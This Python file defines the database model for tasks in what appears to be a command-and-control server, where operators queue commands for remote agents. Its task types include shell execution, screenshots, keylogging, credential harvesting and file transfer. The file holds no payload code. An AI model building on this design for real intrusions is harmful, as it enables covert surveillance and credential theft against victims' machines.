"""
Task Model

Represents a command/task that needs to be executed by an agent.

Flow:
1. Operator creates task → Status: PENDING
2. Agent fetches task → Status: SENT
3. Agent executes task → Status: RUNNING
4. Agent returns result → Status: COMPLETED (or FAILED)
"""

import uuid
from sqlalchemy import Column, String, Integer, Text, DateTime, Enum, ForeignKey
from sqlalchemy.dialects.postgresql import UUID
from sqlalchemy.orm import relationship
from datetime import datetime
import enum

from app.models.database.base import Base, TimeStampMixin


class TaskStatus(str, enum.Enum):
    """
    Task status enumeration.
    
    Tracks the lifecycle of a task:
    PENDING → Task created, waiting for agent to fetch
    SENT → Agent has fetched the task
    RUNNING → Agent is currently executing
    COMPLETED → Task finished successfully
    FAILED → Task execution failed
    CANCELLED → Task was cancelled by operator
    """
    PENDING = "pending"
    SENT = "sent"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


class TaskType(str, enum.Enum):
    """
    Types of tasks the agent can execute.
    
    Each type corresponds to a different agent capability.
    """
    SHELL = "shell"                    # Execute shell command
    SCREENSHOT = "screenshot"          # Capture screenshot
    KEYLOG_START = "keylog_start"      # Start keylogger
    KEYLOG_STOP = "keylog_stop"        # Stop keylogger
    KEYLOG_DUMP = "keylog_dump"        # Get keylog data
    CREDENTIALS = "credentials"        # Harvest credentials
    FILE_UPLOAD = "file_upload"        # Upload file to agent
    FILE_DOWNLOAD = "file_download"    # Download file from agent
    FILE_LIST = "file_list"            # List directory contents
    PROCESS_LIST = "process_list"      # List running processes
    PROCESS_KILL = "process_kill"      # Kill a process
    SLEEP = "sleep"                    # Change sleep interval


class Task(Base, TimeStampMixin):
    """
    Task database model.
    
    Each task represents one command to be executed by an agent.
    """
    
    __tablename__ = "tasks"
    
    # ============================================
    # PRIMARY KEY
    # ============================================
    id = Column(
        UUID(as_uuid=True),
        primary_key=True,
        default=uuid.uuid4,
        unique=True,
        nullable=False
    )
    
    # ============================================
    # FOREIGN KEYS
    # ============================================
    agent_id = Column(
        UUID(as_uuid=True),
        ForeignKey('agents.id', ondelete='CASCADE'),
        nullable=False,
        index=True
    )
    """
    Which agent should execute this task.
    
    ForeignKey links to agents table.
    ondelete='CASCADE' means: if agent is deleted, delete all its tasks too.
    index=True for fast lookups by agent.
    """
    
    created_by = Column(
        UUID(as_uuid=True),
        ForeignKey('operators.id', ondelete='SET NULL'),
        nullable=True
    )
    """
    Which operator created this task.
    
    ondelete='SET NULL' means: if operator is deleted, keep task but set this to NULL.
    """
    
    # ============================================
    # TASK DETAILS
    # ============================================
    task_type = Column(
        Enum(TaskType),
        nullable=False
    )
    """
    Type of task (shell, screenshot, etc.)
    """
    
    command = Column(Text, nullable=False)
    """
    The actual command or instruction.
    
    Examples:
    - For shell: "whoami"
    - For file_download: "/path/to/file.txt"
    - For screenshot: "" (empty, no parameters needed)
    
    Text type = unlimited length (vs String which has limit)
    """
    
    arguments = Column(Text)
    """
    Optional JSON-encoded arguments.
    
    For complex tasks that need structured data.
    Example: '{"path": "/tmp", "recursive": true}'
    """
    
    # ============================================
    # STATUS TRACKING
    # ============================================
    status = Column(
        Enum(TaskStatus),
        default=TaskStatus.PENDING,
        nullable=False,
        index=True
    )
    """
    Current status of the task.
    
    Indexed because we often query: "Give me all PENDING tasks"
    """
    
    priority = Column(Integer, default=5)
    """
    Task priority (1 = highest, 10 = lowest).
    
    Higher priority tasks are executed first.
    Default: 5 (medium priority)
    """
    
    # ============================================
    # TIMESTAMPS
    # ============================================
    sent_at = Column(DateTime, nullable=True)
    """When task was sent to agent"""
    
    started_at = Column(DateTime, nullable=True)
    """When agent started executing"""
    
    completed_at = Column(DateTime, nullable=True)
    """When task finished (success or failure)"""
    
    # ============================================
    # EXECUTION DETAILS
    # ============================================
    timeout = Column(Integer, default=300)
    """
    Maximum execution time in seconds.
    
    Default: 300 seconds = 5 minutes
    If task takes longer, consider it failed.
    """
    
    error = Column(Text)
    """
    Error message if task failed.
    
    Example: "Access denied" or "File not found"
    """
    
    # ============================================
    # RELATIONSHIPS
    # ============================================
    # These are SQLAlchemy relationships (not database columns)
    # They make it easy to access related data
    
    # agent = relationship("Agent", back_populates="tasks")
    # We'll uncomment this when we add back_populates to Agent model
    
    # ============================================
    # METHODS
    # ============================================
    def __repr__(self):
        return f"<Task {self.id} - {self.task_type} ({self.status})>"
    
    def mark_sent(self):
        """Mark task as sent to agent"""
        self.status = TaskStatus.SENT
        self.sent_at = datetime.utcnow()
    
    def mark_running(self):
        """Mark task as currently executing"""
        self.status = TaskStatus.RUNNING
        self.started_at = datetime.utcnow()
    
    def mark_completed(self):
        """Mark task as successfully completed"""
        self.status = TaskStatus.COMPLETED
        self.completed_at = datetime.utcnow()
    
    def mark_failed(self, error: str):
        """Mark task as failed with error message"""
        self.status = TaskStatus.FAILED
        self.error = error
        self.completed_at = datetime.utcnow()
    
    def is_pending(self) -> bool:
        """Check if task is pending"""
        return self.status == TaskStatus.PENDING
    
    def is_terminal(self) -> bool:
        """
        Check if task is in a terminal state.
        
        Terminal states = task is finished (no more changes expected)
        """
        return self.status in [
            TaskStatus.COMPLETED,
            TaskStatus.FAILED,
            TaskStatus.CANCELLED
        ]